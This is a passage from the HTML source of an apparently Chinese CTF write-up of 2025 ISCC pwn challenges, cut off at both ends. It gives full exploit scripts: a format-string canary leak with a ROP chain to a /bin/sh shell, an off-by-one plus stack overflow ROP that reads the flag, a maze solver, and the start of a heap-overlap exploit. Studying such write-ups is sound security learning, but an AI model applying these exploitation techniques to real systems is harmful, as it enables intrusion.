class="comment">#---------------------debug------------------------------</span></span><br><span class="line"><span class="comment"># 自定义cmd</span></span><br><span class="line">cmd = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    set follow-fork-mode parent\n</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 断点</span></span><br><span class="line">bps = [<span class="number">0x406262</span>, <span class="number">0x4062A2</span>]</span><br><span class="line"><span class="comment">#---------------------debug-------------------------------</span></span><br><span class="line"><span class="comment"># pwndbg(1, bps, cmd)</span></span><br><span class="line"></span><br><span class="line">pop_rax_ret = <span class="number">0x0000000000411dc6</span><span class="comment">#: pop rax; ret;</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x000000000040788b</span><span class="comment">#: pop rdi; ret;</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000040797b</span><span class="comment">#: pop rsi; ret;</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x00000000004bc453</span><span class="comment">#: pop rdx; ret;</span></span><br><span class="line">syscall_ret = <span class="number">0x0000000000707d66</span><span class="comment">#: syscall; ret;</span></span><br><span class="line">syscall = <span class="number">0x00000000004c2e22</span><span class="comment">#: syscall;</span></span><br><span class="line">binsh = <span class="number">0x00000000007c70c2</span><span class="comment">#: /bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg(0, bps, cmd)</span></span><br><span class="line"></span><br><span class="line">AES_KEY = <span class="string">b&quot;aewfdefsebrfcyiseygfeaisfygaseiw&quot;</span></span><br><span class="line">AES_IV = <span class="string">b&quot;iscc20250ca81aff&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encrypt</span>(<span class="params">plaintext: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)</span><br><span class="line">padding = <span class="string">b&quot;\x00&quot;</span> * (<span class="number">16</span> - <span class="built_in">len</span>(plaintext) % <span class="number">16</span>)</span><br><span class="line">ciphertext = cipher.encrypt(plaintext + padding)</span><br><span class="line">combined = AES_KEY + AES_IV + ciphertext</span><br><span class="line"><span class="keyword">return</span> base64.b64encode(combined).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg(0, bps, cmd)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露canary</span></span><br><span class="line">payload = aes_encrypt(<span class="string">b&quot;%15$p_aaaa&quot;</span>)</span><br><span class="line">sdla(<span class="string">&quot;please input your date:&quot;</span>, payload)</span><br><span class="line">canary = <span class="built_in">eval</span>(io.recvuntil(<span class="string">b&#x27;_aaaa&#x27;</span>, drop=<span class="literal">True</span>))</span><br><span class="line">leak(<span class="string">&quot;canary&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改qword_932170</span></span><br><span class="line">payload = aes_encrypt(<span class="string">b&quot;%c%7$n&quot;</span>)</span><br><span class="line">sdla(<span class="string">&quot;please input your date:&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span></span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rax_ret)</span><br><span class="line">payload += p64(<span class="number">59</span>)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(pop_rsi_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">sdl(payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><p><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/27.png"></p><p><code>好累啊，感觉快燃尽了</code></p><h3 id="book-manager"><a href="#book-manager" class="headerlink" title="book_manager"></a>book_manager</h3><p><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/28.png"></p><p>漏洞点在 <code>main-&gt;search-&gt;sub_402262</code> 和 <code>main-&gt;display</code> 中<br>这里有off-by-one漏洞，可以通过v12覆盖掉canary结尾的\x00以此使得printf能够泄露canary的值<br><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/29.png"></p><p>在display中将输出的数据都放入的v22和v23中，但是没有检查，所以我们可以通过大量构造book结构体以此来达成溢出<br><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/31.png"></p><p>这里 <code>a1</code> 其实是一个结构体，需要修复一下的,具体如下，修复后就如上图所示了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BookInfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> ID;</span><br><span class="line">  <span class="type">char</span> Title[<span class="number">50</span>];</span><br><span class="line">  _BYTE gap36[<span class="number">2</span>];</span><br><span class="line">  __int64 TitleLength;</span><br><span class="line">  <span class="type">char</span> Author[<span class="number">30</span>];</span><br><span class="line">  __int64 AuthorLength;</span><br><span class="line">  <span class="type">char</span> Publisher[<span class="number">40</span>];</span><br><span class="line">  __int64 PublisherLength;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所以我们的利用方法就是，先使用search来获得canary，然后利用add创建多个book用于溢出<br>得到canary后构造携带ROP的books，计算好溢出，使用save保存后调用display函数就可以溢出打ROP<br>我们构造的ROP里面是调用load函数去打开flag文件并且输出</p><p>完整exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> xidp <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#---------------------初始化----------------------------</span></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">elf_os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">challenge = <span class="string">&quot;./book_manager&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;101.200.155.151:23000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1-远程 其他-本地</span></span><br><span class="line">link = <span class="number">1</span></span><br><span class="line">io, elf, libc = loadfile(challenge, libc_path, ip, arch, elf_os, link)</span><br><span class="line"></span><br><span class="line">debug(<span class="number">0</span>)            <span class="comment"># 其他-debug   1-info</span></span><br><span class="line"><span class="comment">#---------------------初始化-----------------------------</span></span><br><span class="line"><span class="comment">#---------------------debug------------------------------</span></span><br><span class="line"><span class="comment"># 自定义cmd</span></span><br><span class="line">cmd = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    set follow-fork-mode parent\n</span></span><br><span class="line"><span class="string">    hex 0x04E9580 2000\n</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 断点</span></span><br><span class="line">bps = [<span class="number">0x0040345B</span>]</span><br><span class="line"><span class="comment">#---------------------debug-------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">title = <span class="string">b&#x27;a&#x27;</span>*<span class="number">50</span>, author = <span class="string">b&#x27;a&#x27;</span>*<span class="number">30</span>, publisher = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span></span>):</span><br><span class="line">    sdla(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sda(<span class="string">b&#x27;Title&#x27;</span>, title)</span><br><span class="line">    sda(<span class="string">b&#x27;Author&#x27;</span>, author)</span><br><span class="line">    sda(<span class="string">b&#x27;Publisher&#x27;</span>, publisher)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    sdla(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sdla(<span class="string">b&#x27;Enter book ID to delete: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify</span>(<span class="params">idx</span>):</span><br><span class="line">    sdla(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sdla(<span class="string">b&#x27;Please choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sdla(<span class="string">b&#x27;Enter book ID to modify: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">name</span>):</span><br><span class="line">    sdla(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sdla(<span class="string">b&#x27;Please choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sdla(<span class="string">b&#x27;Enter author name: &#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">display</span>():</span><br><span class="line">    sdla(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save</span>():</span><br><span class="line">    sdla(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sort</span>():</span><br><span class="line">    sdla(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>():</span><br><span class="line">    sdla(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x4e9b2d</span> <span class="comment"># 因为程序没有pie所以这个是固定地址</span></span><br><span class="line">load_func = <span class="number">0x40340C</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401a42</span></span><br><span class="line">ret = <span class="number">0x0000000000401a43</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里使用一个search函数来泄露canary</span></span><br><span class="line">sdla(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">sdla(<span class="string">b&#x27;choose&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sda(<span class="string">b&#x27;name&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">40</span>)</span><br><span class="line">rcu(<span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span> + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">canary = u64(rc(<span class="number">7</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="number">8</span></span><br><span class="line">leak(<span class="string">&quot;canary&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 多次填充</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">50</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">30</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">40</span>) <span class="comment"># 一个为0x99</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">1</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg(0, bps, cmd)</span></span><br><span class="line">payload = p64(canary) + p64(<span class="number">0</span>) + p64(ret) + p64(pop_rdi_ret) + p64(flag_addr) + p64(load_func)</span><br><span class="line"><span class="comment"># add(payload, b&#x27;a&#x27;*20 + b&#x27;\x00./flag\x00\x00\x00&#x27;, b&#x27;a&#x27;*40) #本地</span></span><br><span class="line">add(payload, <span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span> + <span class="string">b&#x27;\x00/flag\x00\x00\x00\x00&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>) <span class="comment">#远程</span></span><br><span class="line"></span><br><span class="line">save() <span class="comment"># 保存一下</span></span><br><span class="line">display() <span class="comment"># 会将books的内容以及标题放入栈中，没有进行检测，存在溢出</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg(0, bps, cmd)  </span></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><p><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/32.png"></p><p><code>感受是一道很有创新的题目呢</code></p><h3 id="迷途之子"><a href="#迷途之子" class="headerlink" title="迷途之子"></a><strong>迷途之子</strong></h3><p><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/33.png"></p><p>里面有一个迷宫游戏，用AI写一个迷宫脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Tuple</span>, <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MazeNavigator</span>:</span><br><span class="line"></span><br><span class="line">    MAZE_SIZE = <span class="number">256</span></span><br><span class="line">    TARGET_FLAG = (<span class="number">0x80</span>, <span class="number">0x80</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, maze_data: <span class="type">List</span>[<span class="built_in">int</span>]</span>):</span><br><span class="line">        <span class="variable language_">self</span>.maze = <span class="variable language_">self</span>._normalize_maze(maze_data)</span><br><span class="line">        <span class="variable language_">self</span>.movement = [  <span class="comment"># 移动方向配置</span></span><br><span class="line">            &#123;<span class="string">&#x27;dx&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;dy&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;code&#x27;</span>: <span class="string">&#x27;d&#x27;</span>&#125;,  <span class="comment"># 右</span></span><br><span class="line">            &#123;<span class="string">&#x27;dx&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;dy&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;code&#x27;</span>: <span class="string">&#x27;s&#x27;</span>&#125;,  <span class="comment"># 下</span></span><br><span class="line">            &#123;<span class="string">&#x27;dx&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;dy&#x27;</span>: -<span class="number">1</span>, <span class="string">&#x27;code&#x27;</span>: <span class="string">&#x27;a&#x27;</span>&#125;, <span class="comment"># 左</span></span><br><span class="line">            &#123;<span class="string">&#x27;dx&#x27;</span>: -<span class="number">1</span>, <span class="string">&#x27;dy&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;code&#x27;</span>: <span class="string">&#x27;w&#x27;</span>&#125;  <span class="comment"># 上</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_normalize_maze</span>(<span class="params">self, data: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(data[<span class="number">0</span>], <span class="built_in">int</span>):</span><br><span class="line">            <span class="keyword">return</span> [data[i*<span class="variable language_">self</span>.MAZE_SIZE:(i+<span class="number">1</span>)*<span class="variable language_">self</span>.MAZE_SIZE]</span><br><span class="line">                   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="variable language_">self</span>.MAZE_SIZE)]</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_update_flags</span>(<span class="params">self, move: <span class="built_in">str</span>, curr_flags: <span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]</span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]:</span><br><span class="line">        f1, f2 = curr_flags</span><br><span class="line">        <span class="keyword">if</span> move == <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> (<span class="built_in">max</span>(<span class="number">0</span>, f1 - <span class="number">1</span>), f2)</span><br><span class="line">        <span class="keyword">if</span> move == <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> (<span class="built_in">min</span>(<span class="number">0xFF</span>, f1 + <span class="number">1</span>), f2)</span><br><span class="line">        <span class="keyword">if</span> move == <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> (f1, <span class="built_in">max</span>(<span class="number">0</span>, f2 - <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">if</span> move == <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> (f1, <span class="built_in">min</span>(<span class="number">0xFF</span>, f2 + <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> curr_flags</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_optimal_path</span>(<span class="params">self</span>) -&gt; <span class="type">Optional</span>[<span class="built_in">str</span>]:</span><br><span class="line">        State = <span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>, <span class="type">List</span>[<span class="built_in">str</span>], <span class="built_in">int</span>, <span class="built_in">int</span>]</span><br><span class="line">        initial_state: State = (<span class="number">0</span>, <span class="number">0</span>, [], <span class="number">0x00</span>, <span class="number">0x00</span>)</span><br><span class="line">        bfs_queue = deque([initial_state])</span><br><span class="line">        visited_states = <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">while</span> bfs_queue:</span><br><span class="line">            x, y, path, flag_a, flag_d = bfs_queue.popleft()</span><br><span class="line">            <span class="comment"># 终止条件检查</span></span><br><span class="line">            <span class="keyword">if</span> (flag_a, flag_d) == <span class="variable language_">self</span>.TARGET_FLAG:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(path)</span><br><span class="line">            <span class="comment"># 状态去重</span></span><br><span class="line">            state_key = (x, y, flag_a, flag_d)</span><br><span class="line">            <span class="keyword">if</span> state_key <span class="keyword">in</span> visited_states:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            visited_states.add(state_key)</span><br><span class="line">            <span class="comment"># 遍历移动方向</span></span><br><span class="line">            <span class="keyword">for</span> direction <span class="keyword">in</span> <span class="variable language_">self</span>.movement:</span><br><span class="line">                new_x = x + direction[<span class="string">&#x27;dx&#x27;</span>]</span><br><span class="line">                new_y = y + direction[<span class="string">&#x27;dy&#x27;</span>]</span><br><span class="line">                <span class="comment"># 边界和障碍检查</span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0</span> &lt;= new_x &lt; <span class="variable language_">self</span>.MAZE_SIZE <span class="keyword">and</span> <span class="number">0</span> &lt;= new_y &lt; <span class="variable language_">self</span>.MAZE_SIZE):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> <span class="variable language_">self</span>.maze[new_x][new_y] != <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment"># 更新状态</span></span><br><span class="line">                new_flags = <span class="variable language_">self</span>._update_flags(direction[<span class="string">&#x27;code&#x27;</span>], (flag_a, flag_d))</span><br><span class="line">                new_path = path + [direction[<span class="string">&#x27;code&#x27;</span>]]</span><br><span class="line">                bfs_queue.append( (new_x, new_y, new_path, *new_flags) )</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 初始化迷宫数据</span></span><br><span class="line">    maze_data = []  <span class="comment"># 这里填充实际迷宫数据</span></span><br><span class="line">    navigator = MazeNavigator(maze_data)</span><br><span class="line">    result_path = navigator.find_optimal_path()</span><br><span class="line">    <span class="keyword">if</span> result_path:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;成功生成路径，长度：<span class="subst">&#123;<span class="built_in">len</span>(result_path)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;maze_solution.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">                output_file.write(result_path)</span><br><span class="line">        <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;写入文件失败：<span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;未找到可行路径&quot;</span>)</span><br></pre></td></tr></table></figure><p>得到结果，需要在最后加上一个q用于退出<br><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/34.png"></p><p>解决这个迷宫之后我们就可以得到read函数的地址，也就是白送一个libc地址<br><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/35.png"></p><p>然后下面就是堆题<br><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/36.png"></p><p>但是这个堆本身没有什么漏洞，漏洞在迷宫当中，迷宫中的选项 <code>s</code> 会将<code>user[0]</code>也就是第一个堆块的<code>低字节的第三位+1</code>，从此导致堆块发生重叠<br><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/37.png"></p><p>执行 <code>game(&quot;sq&quot;)</code> 之前<br><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/38.png"></p><p><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/39.png"></p><p>执行 <code>game(&quot;sq&quot;)</code> 之后<br><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/40.png"></p><p>我们可以观察到 <code>0x55555556b2a0</code> 的 <code>next指针</code> 从 <code>0x000055555556b2d0</code> 变成了 <code>0x000055555556b3d0</code><br>这就是game中的漏洞，由此我们可以造成堆块重叠</p><p>完整exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> xidp <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#---------------------初始化----------------------------</span></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">elf_os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">challenge = <span class="string">&quot;./pwn_patched&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;101.200.155.151:22000&#x27;</span></span><br><span class="line"><span class="comment"># 1-远程 其他-本地</span></span><br><span class="line">link = <span class="number">1</span></span><br><span class="line">io, elf, libc = loadfile(challenge, libc_path, ip, arch, elf_os, link)</span><br><span class="line"></span><br><span class="line">debug(<span class="number">0</span>)            <span class="comment"># 其他-debug   1-info</span></span><br><span class="line"><span class="comment">#---------------------初始化-----------------------------</span></span><br><span class="line"><span class="comment">#---------------------debug------------------------------</span></span><br><span class="line"><span class="comment"># 自定义cmd</span></span><br><span class="line">cmd = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    set follow-fork-mode parent\n</span></span><br><span class="line"><span class="string">    x/30gx $rebase(0x0014080)\n</span></span><br><span class="line"><span class="string">    x/30gx $rebase(0x14070)\n</span></span><br><span class="line"><span class="string">    